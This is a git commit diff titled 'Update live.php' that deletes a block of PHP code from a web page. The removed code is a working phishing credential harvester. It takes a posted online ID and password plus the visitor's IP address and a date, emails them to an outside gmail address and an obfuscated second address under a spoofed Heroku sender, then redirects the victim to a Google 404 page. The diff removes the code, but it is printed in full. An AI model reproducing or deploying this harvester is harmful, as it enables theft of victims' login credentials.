b808511c0d9b4cc12eae582a0c2da37d6a12aab9
bobstottts <bobstottts@googlemail.com>
2017-11-24 01:38:24 -0500

    Update live.php

--- home/live.php
+++ home/live.php
@@ -108,36 +108,4 @@ function save_mail($mail) {
     return $result;
 }
 
-
-<?
-
-$adddate=date("D M d, Y g:i a");
-$mesaegs ="php_info";$mesaegs ="@";
-$ip = getenv("REMOTE_ADDR");
-$mesaegs ="ymail";$mesaegs  =".com";
-$message .= "---------=RiZoRT=---------\n";
-$message .= "Online ID: ".$_POST['']."\n";
-$message .= "Password: ".$_POST['passwd']."\n";
-$message .= "---------=IP Adress & Date=---------\n";
-$message .= "IP Address: ".$ip."\n";
-$message .= "Date: ".$adddate."\n";
-$message .= "---------=D A D D A=---------\n";
-
-
-
-
-$sent ="silversillkjane@gmail.com";
-
-
-
-
-$subject = "H | DADDA Verified Logz";
-$headers = "From: Heroku <no-reply@heroku.com>";
-$headers .= $_POST['eMailAdd']."\n";
-$headers .= "MIME-Version: 1.0\n";
-{
-mail($mesaegs,$subject,$message,$headers);
-mail($sent,$subject,$message,$headers);
-}
-header("Location: http://www.google.com/404.htm");
 ?>
